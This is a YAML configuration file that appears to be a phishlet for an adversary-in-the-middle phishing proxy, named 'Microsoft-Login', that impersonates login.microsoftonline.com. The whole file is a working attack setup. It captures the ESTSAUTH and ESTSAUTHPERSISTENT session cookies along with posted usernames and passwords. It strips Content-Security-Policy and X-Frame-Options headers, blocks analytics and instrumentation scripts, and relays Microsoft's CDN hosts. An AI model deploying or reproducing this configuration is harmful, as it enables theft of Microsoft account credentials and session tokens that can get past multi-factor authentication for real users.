name: "Microsoft-Login"
author: "Vanta v5"
min_ver: "5.0.0"
proxy_hosts:
  - subdomain: "login"
    target: "login.microsoftonline.com"
auth_urls: ["/common/oauth2/v2.0/authorize", "/common/login"]
landing_path: ["/common/login"]
auth_tokens:
  - {type: "cookie", name: "ESTSAUTH"}
  - {type: "cookie", name: "ESTSAUTHPERSISTENT"}
  - {type: "cookie", name: "SignInStateCookie"}
credentials:
  - {type: "post_param", name: "loginfmt", regex: null}
  - {type: "post_param", name: "passwd", regex: null}
  - {type: "post_param", name: "username", regex: null}
  - {type: "post_param", name: "password", regex: null}
injections: []
headers:
  - {action: "remove", name: "Content-Security-Policy"}
  - {action: "remove", name: "X-Frame-Options"}
  - {action: "remove", name: "X-Content-Type-Options"}
path_rewrites:
  - {pattern: "^/$", replace: "/common/login", methods: ["GET"]}
cookie_rewrites: []
blocklist:
  - {pattern: "analytics|gtm|/instrumentation|/collect", mimes: ["text/javascript"], max_kb: 512}
form_actions:
  - {selector: "form[action*=\"login\"]", action_to: "/common/sessions"}
bridges:
  - {prefix: "/_mscdn/", target_host: "aadcdn.msftauth.net", strip_prefix: true, cors: "mirror"}
  - {prefix: "/_mscdn2/", target_host: "aadcdn.msauth.net", strip_prefix: true, cors: "mirror"}
